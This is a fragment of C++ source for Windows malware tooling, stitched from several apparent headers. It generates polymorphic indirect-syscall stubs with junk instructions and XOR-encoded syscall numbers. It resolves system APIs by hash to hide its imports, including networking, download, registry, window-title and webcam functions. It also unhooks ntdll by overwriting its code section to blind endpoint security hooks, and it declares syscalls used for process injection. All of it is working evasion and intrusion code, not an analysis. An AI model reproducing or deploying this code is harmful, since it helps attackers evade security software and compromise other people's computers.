        {{ 0x48, 0x87, 0xFF },                         3 },  

        {{ 0x0F, 0x1F, 0x40, 0x00 },                   4 },  
        {{ 0x48, 0x8D, 0x76, 0x00 },                   4 },  
        {{ 0x48, 0x8D, 0x7F, 0x00 },                   4 },  
        {{ 0x48, 0x8D, 0x5B, 0x00 },                   4 },  

        {{ 0x0F, 0x1F, 0x44, 0x00, 0x00 },             5 },  

        {{ 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00 }, 7 },  

        {{ 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00 }, 9 }, 
    };
    static const int g_junkTableSize = sizeof(g_junkTable) / sizeof(g_junkTable[0]);

#else 

    struct JunkEntry {
        unsigned char bytes[7];
        unsigned char len;
    };

    static const JunkEntry g_junkTable[] = {
        {{ 0x90 },                       1 },  
        {{ 0x53, 0x5B },                 2 },  
        {{ 0x55, 0x5D },                 2 },  
        {{ 0x56, 0x5E },                 2 },  
        {{ 0x57, 0x5F },                 2 },  
        {{ 0x87, 0xDB },                 2 },  
        {{ 0x87, 0xF6 },                 2 },  
        {{ 0x87, 0xFF },                 2 },  
        {{ 0x8D, 0x76, 0x00 },           3 },  
        {{ 0x8D, 0x7F, 0x00 },           3 },  
        {{ 0x0F, 0x1F, 0x00 },           3 },  
        {{ 0x0F, 0x1F, 0x40, 0x00 },     4 },  
        {{ 0x8D, 0xB4, 0x26, 0x00, 0x00, 0x00, 0x00 }, 7 }, 
    };
    static const int g_junkTableSize = sizeof(g_junkTable) / sizeof(g_junkTable[0]);

#endif

    static __forceinline void GenerateJunk(unsigned char* buffer, size_t maxLen, size_t* outLen) {
        size_t written = 0;

        int count = 1 + (int)FastRandRange((DWORD)JUNK_LEVEL);
        for (int i = 0; i < count && written < maxLen; i++) {
            int idx = (int)FastRandRange((DWORD)g_junkTableSize);
            const JunkEntry& entry = g_junkTable[idx];
            if (written + entry.len > maxLen) break;
            for (int j = 0; j < entry.len; j++) {
                buffer[written++] = entry.bytes[j];
            }
        }
        *outLen = written;
    }

    struct EncodedSSN {
        DWORD encoded;   
        DWORD key;       
    };

    static __forceinline EncodedSSN EncodeSSN(WORD ssn) {
        EncodedSSN result;
        result.key = FastRand();
        result.encoded = (DWORD)ssn ^ result.key;
        return result;
    }

#ifdef _WIN64

    static __forceinline size_t BuildPolymorphicStub(
        unsigned char* buf,
        size_t bufSize,
        WORD ssn,
        LPVOID gadget)
    {
        size_t pos = 0;

        size_t junkLen = 0;
        if (FastRandRange(100) < 75) {  
            size_t maxJunk = (bufSize - pos > 70) ? 30 : (bufSize - pos > 50) ? 10 : 0;
            if (maxJunk > 0) {
                GenerateJunk(buf + pos, maxJunk, &junkLen);
                pos += junkLen;
            }
        }

        if (FastRandRange(2) == 0) {
            buf[pos++] = 0x4C; buf[pos++] = 0x8B; buf[pos++] = 0xD1; 
        } else {
            buf[pos++] = 0x49; buf[pos++] = 0x89; buf[pos++] = 0xCA; 
        }

        switch (FastRandRange(3)) {
            case 0: {

                EncodedSSN enc = EncodeSSN(ssn);
                buf[pos++] = 0xB8; 
                *(DWORD*)(buf + pos) = enc.encoded; pos += 4;
                buf[pos++] = 0x35; 
                *(DWORD*)(buf + pos) = enc.key; pos += 4;
                break;
            }
            case 1: {

                buf[pos++] = 0xB8;
                *(DWORD*)(buf + pos) = (DWORD)ssn; pos += 4;
                break;
            }
            default: {

                DWORD delta = FastRand() & 0xFFFF;
                DWORD base = (DWORD)ssn - delta;
                buf[pos++] = 0xB8; 
                *(DWORD*)(buf + pos) = base; pos += 4;
                buf[pos++] = 0x05; 
                *(DWORD*)(buf + pos) = delta; pos += 4;
                break;
            }
        }

        if (FastRandRange(100) < 50) {
            size_t midJunk = 0;
            size_t maxMid = (bufSize - pos > 35) ? 15 : (bufSize - pos > 25) ? 5 : 0;
            if (maxMid > 0) {
                GenerateJunk(buf + pos, maxMid, &midJunk);
                pos += midJunk;
            }
        }

        switch (FastRandRange(3)) {
            case 0: {

                buf[pos++] = 0x49; buf[pos++] = 0xBB; 
                *(size_t*)(buf + pos) = (size_t)gadget; pos += 8;
                buf[pos++] = 0x41; buf[pos++] = 0xFF; buf[pos++] = 0xE3; 
                break;
            }
            case 1: {

                DWORD lo = (DWORD)((size_t)gadget & 0xFFFFFFFF);
                DWORD hi = (DWORD)((size_t)gadget >> 32);
                buf[pos++] = 0x68; 
                *(DWORD*)(buf + pos) = lo; pos += 4;

                buf[pos++] = 0xC7; buf[pos++] = 0x44; buf[pos++] = 0x24; buf[pos++] = 0x04;
                *(DWORD*)(buf + pos) = hi; pos += 4;
                buf[pos++] = 0xC3; 
                break;
            }
            default: {

                buf[pos++] = 0x49; buf[pos++] = 0xBB; 
                *(size_t*)(buf + pos) = (size_t)gadget; pos += 8;
                buf[pos++] = 0x41; buf[pos++] = 0x53; 
                buf[pos++] = 0xC3; 
                break;
            }
        }

        return pos;
    }

#else 

    static __forceinline size_t BuildPolymorphicStub(
        unsigned char* buf,
        size_t bufSize,
        WORD ssn,
        LPVOID gadget,
        WORD retBytes)
    {
        size_t pos = 0;

        size_t junkLen = 0;
        if (FastRandRange(100) < 75) {
            GenerateJunk(buf + pos, (bufSize - pos > 20) ? 20 : bufSize - pos - 25, &junkLen);
            pos += junkLen;
        }

        if (FastRandRange(2) == 0) {
            EncodedSSN enc = EncodeSSN(ssn);
            buf[pos++] = 0xB8; 
            *(DWORD*)(buf + pos) = enc.encoded; pos += 4;
            buf[pos++] = 0x35; 
            *(DWORD*)(buf + pos) = enc.key; pos += 4;
        } else {
            buf[pos++] = 0xB8;
            *(DWORD*)(buf + pos) = (DWORD)ssn; pos += 4;
        }

        if (FastRandRange(100) < 50) {
            size_t midJunk = 0;
            GenerateJunk(buf + pos, (bufSize - pos > 10) ? 10 : bufSize - pos - 15, &midJunk);
            pos += midJunk;
        }

        buf[pos++] = 0xBA;
        *(DWORD*)(buf + pos) = (DWORD)(size_t)gadget; pos += 4;

        buf[pos++] = 0xFF;
        buf[pos++] = 0xE2; 

        buf[pos++] = 0xC2;
        *(WORD*)(buf + pos) = retBytes; pos += 2;

        return pos;
    }

#endif

    static __forceinline void RandomWipeStub(void* pStub, size_t len) {
        volatile unsigned char* p = (volatile unsigned char*)pStub;

        for (size_t i = 0; i < len; i++) {

            switch (FastRandRange(4)) {
                case 0: p[i] = 0xCC; break;  
                case 1: p[i] = 0x90; break;  
                case 2: p[i] = 0xC3; break;  
                default: p[i] = (unsigned char)FastRandRange(256); break;
            }
        }
    }
}

#include <windows.h>

typedef LPVOID HINTERNET;
#include <tlhelp32.h>
#include <objbase.h>
#include <bcrypt.h>
#include <vector>
#include <string>
#ifndef WSAAPI
#define WSAAPI __stdcall
#endif
#ifndef HASH_SEED
#define HASH_SEED 5381
#endif
namespace Resolver {
    constexpr DWORD HashString(const char* str) {
        DWORD hash = HASH_SEED;
        int c = 0;
        while (c = *str++) {
            if (c >= 'A' && c <= 'Z') c += 32;
            hash = ((hash << 5) + hash) + c;
        }
        return hash;
    }
    template <DWORD V>
    struct ConstHash {
        static constexpr DWORD value = V;
    };
#define HASH_API(str) Resolver::ConstHash<Resolver::HashString(str)>::value
    extern DWORD g_runtimeXorKey;
    void InitRuntimeKeys();
    LPVOID GetAPIByHash(DWORD dllHash, DWORD funcHash);
    inline DWORD HASH_NTDLL     = HASH_API("ntdll.dll");
    inline DWORD HASH_KERNEL32  = HASH_API("kernel32.dll");
    inline DWORD HASH_KERNELBASE = HASH_API("kernelbase.dll");
    inline DWORD HASH_ADVAPI32  = HASH_API("advapi32.dll");
    inline DWORD HASH_WININET   = HASH_API("wininet.dll");
    inline DWORD HASH_CRYPT32   = HASH_API("crypt32.dll");
    inline DWORD HASH_USER32    = HASH_API("user32.dll");
    inline DWORD HASH_WS2_32    = HASH_API("ws2_32.dll");
    inline DWORD HASH_IPHLPAPI  = HASH_API("iphlpapi.dll");
    inline DWORD HASH_OLE32     = HASH_API("ole32.dll");
    inline DWORD HASH_OLEAUT32  = HASH_API("oleaut32.dll");
    inline DWORD HASH_VFW32     = HASH_API("vfw32.dll");
    inline DWORD HASH_BCRYPT    = HASH_API("bcrypt.dll");
    inline DWORD HASH_SHELL32   = HASH_API("shell32.dll");
    inline DWORD HASH_LOADLIBRARYA         = HASH_API("LoadLibraryA");
    inline DWORD HASH_GETPROCADDRESS       = HASH_API("GetProcAddress");
    inline DWORD HASH_MULTIBYTETOWIDECHAR  = HASH_API("MultiByteToWideChar");
    inline DWORD HASH_VIRTUALALLOC         = HASH_API("VirtualAlloc");
    inline DWORD HASH_VIRTUALPROTECT       = HASH_API("VirtualProtect");
    inline DWORD HASH_VIRTUALFREE          = HASH_API("VirtualFree");
    inline DWORD HASH_GETMODULEHANDLEA     = HASH_API("GetModuleHandleA");
    inline DWORD HASH_GETSYSTEMINFO        = HASH_API("GetSystemInfo");
    inline DWORD HASH_GETCOMPUTERNAMEA      = HASH_API("GetComputerNameA");
    inline DWORD HASH_GETSYSTEMDIRECTORYA   = HASH_API("GetSystemDirectoryA");
    inline DWORD HASH_GETDISKFREESPACEEXA   = HASH_API("GetDiskFreeSpaceExA");
    inline DWORD HASH_GLOBALMEMORYSTATUSEX  = HASH_API("GlobalMemoryStatusEx");
    inline DWORD HASH_GETCURRENTPROCESSID   = HASH_API("GetCurrentProcessId");
    inline DWORD HASH_GETCURRENTTHREADID    = HASH_API("GetCurrentThreadId");
    inline DWORD HASH_SETPROCESSWORKINGSETSIZE = HASH_API("SetProcessWorkingSetSize");
    inline DWORD HASH_SETTHREADEXECUTIONSTATE  = HASH_API("SetThreadExecutionState");
    inline DWORD HASH_GETTICKCOUNT           = HASH_API("GetTickCount");
    inline DWORD HASH_CREATEMUTEXA          = HASH_API("CreateMutexA");
    inline DWORD HASH_GETLASTERROR          = HASH_API("GetLastError");
    inline DWORD HASH_GETMODULEFILENAMEA    = HASH_API("GetModuleFileNameA");
    inline DWORD HASH_FILETIMETOSYSTEMTIME  = HASH_API("FileTimeToSystemTime");
    inline DWORD HASH_CREATEFILEA           = HASH_API("CreateFileA");
    inline DWORD HASH_GETFILETIME           = HASH_API("GetFileTime");
    inline DWORD HASH_CLOSEHANDLE           = HASH_API("CloseHandle");
    inline DWORD HASH_CREATETOOLHELP32SNAPSHOT = HASH_API("CreateToolhelp32Snapshot");
    inline DWORD HASH_THREAD32FIRST         = HASH_API("Thread32First");
    inline DWORD HASH_THREAD32NEXT          = HASH_API("Thread32Next");
    inline DWORD HASH_OPENTHREAD           = HASH_API("OpenThread");
    inline DWORD HASH_SUSPENDTHREAD        = HASH_API("SuspendThread");
    inline DWORD HASH_RESUMETHREAD         = HASH_API("ResumeThread");
    inline DWORD HASH_GETPROCESSHEAP       = HASH_API("GetProcessHeap");
    inline DWORD HASH_HEAPALLOC            = HASH_API("HeapAlloc");
    inline DWORD HASH_HEAPFREE             = HASH_API("HeapFree");
    inline DWORD HASH_CREATEFILEMAPPINGA    = HASH_API("CreateFileMappingA");
    inline DWORD HASH_MAPVIEWOFFILE         = HASH_API("MapViewOfFile");
    inline DWORD HASH_UNMAPVIEWOFFILE       = HASH_API("UnmapViewOfFile");
    inline DWORD HASH_GETUSERNAMEA         = HASH_API("GetUserNameA");
    inline DWORD HASH_REGCREATEKEYEXA      = HASH_API("RegCreateKeyExA");
    inline DWORD HASH_REGSETVALUEEXA       = HASH_API("RegSetValueExA");
    inline DWORD HASH_REGOPENKEYEXA        = HASH_API("RegOpenKeyExA");
    inline DWORD HASH_REGQUERYVALUEEXA     = HASH_API("RegQueryValueExA");
    inline DWORD HASH_REGCLOSEKEY          = HASH_API("RegCloseKey");
    inline DWORD HASH_OPENPROCESSTOKEN     = HASH_API("OpenProcessToken");
    inline DWORD HASH_GETTOKENINFORMATION  = HASH_API("GetTokenInformation");
    inline DWORD HASH_GETFOREGROUNDWINDOW  = HASH_API("GetForegroundWindow");
    inline DWORD HASH_GETWINDOWTEXTA       = HASH_API("GetWindowTextA");
    inline DWORD HASH_GETLASTINPUTINFO     = HASH_API("GetLastInputInfo");
    inline DWORD HASH_ENUMDISPLAYDEVICESA  = HASH_API("EnumDisplayDevicesA");
    inline DWORD HASH_WSASTARTUP           = HASH_API("WSAStartup");
    inline DWORD HASH_WSACLEANUP           = HASH_API("WSACleanup");
    inline DWORD HASH_SOCKET               = HASH_API("socket");
    inline DWORD HASH_CONNECT              = HASH_API("connect");
    inline DWORD HASH_SEND                 = HASH_API("send");
    inline DWORD HASH_RECV                 = HASH_API("recv");
    inline DWORD HASH_CLOSESOCKET          = HASH_API("closesocket");
    inline DWORD HASH_GETADDRINFO          = HASH_API("getaddrinfo");
    inline DWORD HASH_FREEADDRINFO         = HASH_API("freeaddrinfo");
    inline DWORD HASH_SETSOCKOPT           = HASH_API("setsockopt");
    inline DWORD HASH_INTERNETOPENA        = HASH_API("InternetOpenA");
    inline DWORD HASH_INTERNETOPENURLA     = HASH_API("InternetOpenUrlA");
    inline DWORD HASH_INTERNETREADFILE     = HASH_API("InternetReadFile");
    inline DWORD HASH_INTERNETCLOSEHANDLE  = HASH_API("InternetCloseHandle");
    inline DWORD HASH_CRYPTSTRINGTOBINARYA = HASH_API("CryptStringToBinaryA");
    inline DWORD HASH_BCRYPTOPENALGORITHMPROVIDER   = HASH_API("BCryptOpenAlgorithmProvider");
    inline DWORD HASH_BCRYPTGETPROPERTY             = HASH_API("BCryptGetProperty");
    inline DWORD HASH_BCRYPTCREATEHASH              = HASH_API("BCryptCreateHash");
    inline DWORD HASH_BCRYPTHASHDATA                = HASH_API("BCryptHashData");
    inline DWORD HASH_BCRYPTFINISHHASH              = HASH_API("BCryptFinishHash");
    inline DWORD HASH_BCRYPTDESTROYHASH             = HASH_API("BCryptDestroyHash");
    inline DWORD HASH_BCRYPTCLOSEALGORITHMPROVIDER  = HASH_API("BCryptCloseAlgorithmProvider");
    inline DWORD HASH_BCRYPTGENRANDOM               = HASH_API("BCryptGenRandom");
    inline DWORD HASH_BCRYPTSETPROPERTY             = HASH_API("BCryptSetProperty");
    inline DWORD HASH_BCRYPTGENERATESYMMETRICKEY    = HASH_API("BCryptGenerateSymmetricKey");
    inline DWORD HASH_BCRYPTENCRYPT                 = HASH_API("BCryptEncrypt");
    inline DWORD HASH_BCRYPTDECRYPT                 = HASH_API("BCryptDecrypt");
    inline DWORD HASH_BCRYPTDESTROYKEY              = HASH_API("BCryptDestroyKey");
    inline DWORD HASH_COINITIALIZEEX       = HASH_API("CoInitializeEx");
    inline DWORD HASH_COINITIALIZESECURITY = HASH_API("CoInitializeSecurity");
    inline DWORD HASH_COCREATEINSTANCE     = HASH_API("CoCreateInstance");
    inline DWORD HASH_COUNINITIALIZE       = HASH_API("CoUninitialize");
    inline DWORD HASH_VARIANTCLEAR         = HASH_API("VariantClear");
    inline DWORD HASH_CAPGETDRIVERDESCRIPTIONA = HASH_API("capGetDriverDescriptionA");
    inline DWORD HASH_ISUSERANADMIN        = HASH_API("IsUserAnAdmin");
    typedef HMODULE (WINAPI* LoadLibraryA_t)(LPCSTR);
    typedef FARPROC (WINAPI* GetProcAddress_t)(HMODULE, LPCSTR);
    typedef int (WINAPI* MultiByteToWideChar_t)(UINT, DWORD, LPCCH, int, LPWSTR, int);
    typedef LPVOID (WINAPI* VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL (WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
    typedef BOOL (WINAPI* VirtualFree_t)(LPVOID, SIZE_T, DWORD);
    typedef HMODULE (WINAPI* GetModuleHandleA_t)(LPCSTR);
    typedef void (WINAPI* GetSystemInfo_t)(LPSYSTEM_INFO);
    typedef BOOL (WINAPI* GetComputerNameA_t)(LPSTR, LPDWORD);
    typedef UINT (WINAPI* GetSystemDirectoryA_t)(LPSTR, UINT);
    typedef BOOL (WINAPI* GetDiskFreeSpaceExA_t)(LPCSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);
    typedef BOOL (WINAPI* GlobalMemoryStatusEx_t)(LPMEMORYSTATUSEX);
    typedef DWORD (WINAPI* GetCurrentProcessId_t)();
    typedef DWORD (WINAPI* GetCurrentThreadId_t)();
    typedef BOOL (WINAPI* SetProcessWorkingSetSize_t)(HANDLE, SIZE_T, SIZE_T);
    typedef EXECUTION_STATE (WINAPI* SetThreadExecutionState_t)(EXECUTION_STATE);
    typedef DWORD (WINAPI* GetTickCount_t)();
    typedef HANDLE (WINAPI* CreateMutexA_t)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
    typedef DWORD (WINAPI* GetLastError_t)();
    typedef DWORD (WINAPI* GetModuleFileNameA_t)(HMODULE, LPSTR, DWORD);
    typedef BOOL (WINAPI* FileTimeToSystemTime_t)(const FILETIME*, LPSYSTEMTIME);
    typedef HANDLE (WINAPI* CreateFileA_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    typedef BOOL (WINAPI* GetFileTime_t)(HANDLE, LPFILETIME, LPFILETIME, LPFILETIME);
    typedef BOOL (WINAPI* CloseHandle_t)(HANDLE);
    typedef HANDLE (WINAPI* CreateToolhelp32Snapshot_t)(DWORD, DWORD);
    typedef BOOL (WINAPI* Thread32First_t)(HANDLE, LPTHREADENTRY32);
    typedef BOOL (WINAPI* Thread32Next_t)(HANDLE, LPTHREADENTRY32);
    typedef HANDLE (WINAPI* OpenThread_t)(DWORD, BOOL, DWORD);
    typedef DWORD (WINAPI* SuspendThread_t)(HANDLE);
    typedef DWORD (WINAPI* ResumeThread_t)(HANDLE);
    typedef HANDLE (WINAPI* GetProcessHeap_t)();
    typedef LPVOID (WINAPI* HeapAlloc_t)(HANDLE, DWORD, SIZE_T);
    typedef BOOL (WINAPI* HeapFree_t)(HANDLE, DWORD, LPVOID);
    typedef HANDLE (WINAPI* CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
    typedef LPVOID (WINAPI* MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
    typedef BOOL (WINAPI* UnmapViewOfFile_t)(LPCVOID);
    typedef BOOL (WINAPI* GetUserNameA_t)(LPSTR, LPDWORD);
    typedef LSTATUS (WINAPI* RegCreateKeyExA_t)(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
    typedef LSTATUS (WINAPI* RegSetValueExA_t)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
    typedef LSTATUS (WINAPI* RegOpenKeyExA_t)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
    typedef LSTATUS (WINAPI* RegQueryValueExA_t)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
    typedef LSTATUS (WINAPI* RegCloseKey_t)(HKEY);
    typedef BOOL (WINAPI* OpenProcessToken_t)(HANDLE, DWORD, PHANDLE);
    typedef BOOL (WINAPI* GetTokenInformation_t)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
    typedef HWND (WINAPI* GetForegroundWindow_t)();
    typedef int (WINAPI* GetWindowTextA_t)(HWND, LPSTR, int);
    typedef BOOL (WINAPI* GetLastInputInfo_t)(PLASTINPUTINFO);
    typedef BOOL (WINAPI* EnumDisplayDevicesA_t)(LPCSTR, DWORD, PDISPLAY_DEVICEA, DWORD);
    typedef int (WSAAPI* WSAStartup_t)(WORD, LPWSADATA);
    typedef int (WSAAPI* WSACleanup_t)();
    typedef SOCKET (WSAAPI* socket_t)(int, int, int);
    typedef int (WSAAPI* connect_t)(SOCKET, const struct sockaddr*, int);
    typedef int (WSAAPI* send_t)(SOCKET, const char*, int, int);
    typedef int (WSAAPI* recv_t)(SOCKET, char*, int, int);
    typedef int (WSAAPI* closesocket_t)(SOCKET);
    typedef int (WSAAPI* getaddrinfo_t)(PCSTR, PCSTR, const struct addrinfo*, struct addrinfo**);
    typedef void (WSAAPI* freeaddrinfo_t)(struct addrinfo*);
    typedef int (WSAAPI* setsockopt_t)(SOCKET, int, int, const char*, int);
    typedef HINTERNET (WINAPI* InternetOpenA_t)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
    typedef HINTERNET (WINAPI* InternetOpenUrlA_t)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
    typedef BOOL (WINAPI* InternetReadFile_t)(HINTERNET, LPVOID, DWORD, LPDWORD);
    typedef BOOL (WINAPI* InternetCloseHandle_t)(HINTERNET);
    typedef BOOL (WINAPI* CryptStringToBinaryA_t)(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);
    typedef NTSTATUS (WINAPI* BCryptOpenAlgorithmProvider_t)(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
    typedef NTSTATUS (WINAPI* BCryptGetProperty_t)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG*, ULONG);
    typedef NTSTATUS (WINAPI* BCryptCreateHash_t)(BCRYPT_ALG_HANDLE, BCRYPT_HASH_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
    typedef NTSTATUS (WINAPI* BCryptHashData_t)(BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG);
    typedef NTSTATUS (WINAPI* BCryptFinishHash_t)(BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG);
    typedef NTSTATUS (WINAPI* BCryptDestroyHash_t)(BCRYPT_HASH_HANDLE);
    typedef NTSTATUS (WINAPI* BCryptCloseAlgorithmProvider_t)(BCRYPT_ALG_HANDLE, ULONG);
    typedef NTSTATUS (WINAPI* BCryptGenRandom_t)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG);
    typedef NTSTATUS (WINAPI* BCryptSetProperty_t)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
    typedef NTSTATUS (WINAPI* BCryptGenerateSymmetricKey_t)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
    typedef NTSTATUS (WINAPI* BCryptEncrypt_t)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
    typedef NTSTATUS (WINAPI* BCryptDecrypt_t)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
    typedef NTSTATUS (WINAPI* BCryptDestroyKey_t)(BCRYPT_KEY_HANDLE);
    typedef HRESULT (WINAPI* CoInitializeEx_t)(LPVOID, DWORD);
    typedef HRESULT (WINAPI* CoInitializeSecurity_t)(PSECURITY_DESCRIPTOR, LONG, void*, void*, DWORD, DWORD, void*, DWORD, void*);
    typedef HRESULT (WINAPI* CoCreateInstance_t)(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
    typedef void (WINAPI* CoUninitialize_t)();
    typedef void (WINAPI* VariantClear_t)(VARIANTARG*);
    typedef BOOL (WINAPI* capGetDriverDescriptionA_t)(WORD, LPSTR, int, LPSTR, int);
    typedef BOOL (WINAPI* IsUserAnAdmin_t)();
}

#include <windows.h>
namespace NtdllUnhook {
    inline bool Execute() {
        SLOG("[UNHOOK] Starting ntdll unhooking...");
        auto ntdllStr = OBFS_S("ntdll.dll");
        HMODULE hNtdll = Internal::_GetModuleHandleA(ntdllStr.c_str());
        if (!hNtdll) {
            SLOG("[UNHOOK] GetModuleHandle(ntdll) FAILED");
            return false;
        }
        SLOG("[UNHOOK] Current ntdll at %p", hNtdll);
        auto ntdllPath = OBFS_S("C:\\Windows\\System32\\ntdll.dll");
        HANDLE hFile = Internal::_CreateFileA(
            ntdllPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            SLOG("[UNHOOK] CreateFileA(ntdll.dll) FAILED");
            return false;
        }
        SLOG("[UNHOOK] File handle OK");
        HANDLE hMapping = Internal::_CreateFileMappingA(
            hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
        if (!hMapping) {
            SLOG("[UNHOOK] CreateFileMappingA FAILED");
            Internal::_CloseHandle(hFile);
            return false;
        }
        SLOG("[UNHOOK] Mapping handle OK");
        LPVOID pFreshNtdll = Internal::_MapViewOfFile(
            hMapping, FILE_MAP_READ, 0, 0, 0);
        if (!pFreshNtdll) {
            SLOG("[UNHOOK] MapViewOfFile FAILED");
            Internal::_CloseHandle(hMapping);
            Internal::_CloseHandle(hFile);
            return false;
        }
        SLOG("[UNHOOK] Fresh ntdll mapped at %p", pFreshNtdll);
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pDos->e_lfanew);
        PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
        bool textFound = false;
        for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
            if (pSection[i].Name[0] == '.' &&
                pSection[i].Name[1] == 't' &&
                pSection[i].Name[2] == 'e' &&
                pSection[i].Name[3] == 'x' &&
                pSection[i].Name[4] == 't') {
                LPVOID pCurrentText = (BYTE*)hNtdll + pSection[i].VirtualAddress;
                LPVOID pFreshText   = (BYTE*)pFreshNtdll + pSection[i].VirtualAddress;
                SIZE_T textSize     = pSection[i].Misc.VirtualSize;
                SLOG("[UNHOOK] .text: RVA=0x%X size=%zu current=%p fresh=%p",
                     pSection[i].VirtualAddress, textSize, pCurrentText, pFreshText);
                PVOID baseAddr = pCurrentText;
                SIZE_T regionSize = textSize;
                ULONG oldProtect = 0;
                NTSTATUS status = Syscalls::NtProtectVirtualMemory(
                    (HANDLE)-1, &baseAddr, &regionSize,
                    PAGE_EXECUTE_READWRITE, &oldProtect);
                if (status != 0) {
                    SLOG("[UNHOOK] Syscall NtProtect FAILED: 0x%X, trying VirtualProtect", status);
                    DWORD dwOld = 0;
                    if (!Internal::_VirtualProtect(pCurrentText, textSize,
                                                    PAGE_EXECUTE_READWRITE, &dwOld)) {
                        SLOG("[UNHOOK] VirtualProtect fallback also FAILED");
                        break;
                    }
                    oldProtect = dwOld;
                }
                SLOG("[UNHOOK] Protection changed to RWX (old=0x%X)", oldProtect);
                volatile BYTE* dst = (volatile BYTE*)pCurrentText;
                BYTE* src = (BYTE*)pFreshText;
                for (SIZE_T j = 0; j < textSize; j++) {
                    dst[j] = src[j];
                }
                SLOG("[UNHOOK] .text overwritten (%zu bytes)", textSize);
                baseAddr = pCurrentText;
                regionSize = textSize;
                ULONG tmpProtect = 0;
                Syscalls::NtProtectVirtualMemory(
                    (HANDLE)-1, &baseAddr, &regionSize,
                    oldProtect, &tmpProtect);
                SLOG("[UNHOOK] Protection restored to 0x%X", oldProtect);
                textFound = true;
                break;
            }
        }
        Internal::_UnmapViewOfFile(pFreshNtdll);
        Internal::_CloseHandle(hMapping);
        Internal::_CloseHandle(hFile);
        if (textFound) {
            SLOG("[UNHOOK] ntdll unhook completed SUCCESSFULLY");
        } else {
            SLOG("[UNHOOK] .text section NOT FOUND in ntdll");
        }
        return textFound;
    }
}

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <windows.h>
#include <string>
typedef LONG NTSTATUS;
#define SYSCALL_LOG(msg, ssn, status) ((void)0)

#ifndef POLY_SYSCALLS
#define POLY_SYSCALLS 1
#endif

#define POLY_STUB_MAX 128
namespace Syscalls {
    const NTSTATUS STATUS_SUCCESS = 0;
    WORD   GetSSN(const std::string& funcName);
    LPVOID GetSyscallGadget();
    NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
    NTSTATUS NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
    NTSTATUS NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
    NTSTATUS NtDelayExecution(BOOLEAN Alertable, LONGLONG* DelayInterval);
    NTSTATUS NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);
    NTSTATUS NtClose(HANDLE Handle);
    NTSTATUS NtQueryInformationProcess(HANDLE ProcessHandle, ULONG ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
    NTSTATUS NtSetInformationThread(HANDLE ThreadHandle, ULONG ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength);
    NTSTATUS NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
    NTSTATUS NtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead);
    NTSTATUS NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, PVOID ClientId);
